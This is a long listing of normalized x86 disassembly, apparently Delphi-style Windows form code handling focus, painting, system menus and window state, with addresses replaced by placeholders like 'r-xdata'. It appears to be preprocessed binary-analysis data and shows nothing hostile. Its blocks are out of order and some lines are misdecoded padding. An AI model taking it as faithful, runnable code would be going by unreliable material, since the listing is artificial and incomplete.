pop ecx
mov [ fs : eax ] edx
push sub_4697cf
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403b7c
jmp r-xdata
call sub_403b7c
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_451b90
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_4550b4
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_465574
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44fa80
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
call sub_403b7c
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_4550b4
mov dx 0xb01a
call sub_465574
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403b7c
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44fa80
sub_4697ec
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44fa80
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_4550b4
push eax
call SetFocus
mov eax ebx
call sub_4550b4
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_46983c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44fa80
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4698f0
mov eax esi
call sub_4697ec
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4554dc
mov edx eax
mov eax esi
call sub_469434
sub_4698a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4684b8
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44fa80
mov eax ebx
call sub_4684b8
mov edx esi
call sub_4698a0
sub_4698f0
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_4628c0
mov edx esi
call sub_4628a4
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_469998
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_4699e4
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_469998
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_469a14
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_469998
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_469a80
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_425720
xor eax eax
push ebp
push sub_469b2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_425b4c
xor eax eax
push ebp
push sub_469b0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403518
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469b12
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_425b4c
retn
sub_469b3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4684b8
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_4684ec
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403518
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_45437c
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_468538
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403518
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_469bdc
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4550b4
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_4550b4
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_469a64
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_4550b4
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_453244
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_469c5a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_425300
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_469cbc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4550b4
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_453508
pop edi
pop esi
retn
sub_469d08
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4550b4
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_469e04
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_46882c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_469d08
pop ecx
sub_469e38
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ff9c
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4550b4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4550b4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4550b4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44ef74
pop esi
pop ebx
retn
sub_469ec8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_454308
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_4550b4
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_4622e0
sub_469f28
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4533a4
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_461cf4
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_469f74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_462554
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_469fac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_46a047
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a04e
lea eax [ ebp - 0x4 ]
call sub_404118
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_461c54
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46ed68
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_44ba18
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46ed68
jmp r-xdata
sub_46a074
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403518
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_46a0b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d364
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_46a0e0
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4698a0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_44b7f0
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_46a138
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_4541ec
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46d71c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403518
sub_46a1c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_4550b4
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_4550b4
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_4550b4
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_46a25c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4550b4
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_46983c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403518
sub_46a2b4
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_4555e8
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_46a2e0
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4698a0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46a2fc
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_461c84
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_461c84
sub_46a33c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_46a374
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_40416c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_46a3a8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46a4f9
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a500
lea eax [ ebp - 0x10 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_46a2fc
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_44b794
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417644
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44e3cc
lea eax [ ebp - 0x1c ]
call sub_406e64
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_46a2fc
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_46a33c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_46ea0c
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_46ea74
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_46ea74
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_46a374
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_417644
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44e3cc
lea eax [ ebp - 0x1c ]
call sub_406e64
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46e9a4
test [ esi + 0x228 ] 0x8
je r-xdata
sub_46a508
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_46a57c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_46a5a8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_453650
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4685b8
lea edx [ ebp - 0x14 ]
call sub_46bd80
push ebp
mov eax [ ebp - 0x4 ]
call sub_4685b8
lea edx [ ebp - 0x24 ]
call sub_46bd80
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_46a57c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4685b8
lea edx [ ebp - 0x24 ]
call sub_46bd80
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_46a57c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_46a57c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_46a57c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_46a660
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403518
pop esi
pop ebx
retn
sub_46a684
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403518
pop esi
pop ebx
retn
sub_46a6a8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_454530
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_4555e8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_4555e8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_46a744
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46acae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_46ee58
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_46ac91
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac98
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
push ebp
push sub_46ab98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_46a7fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4698f0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45260c
jmp r-xdata
mov eax [ rw-data ]
call sub_46bfdc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
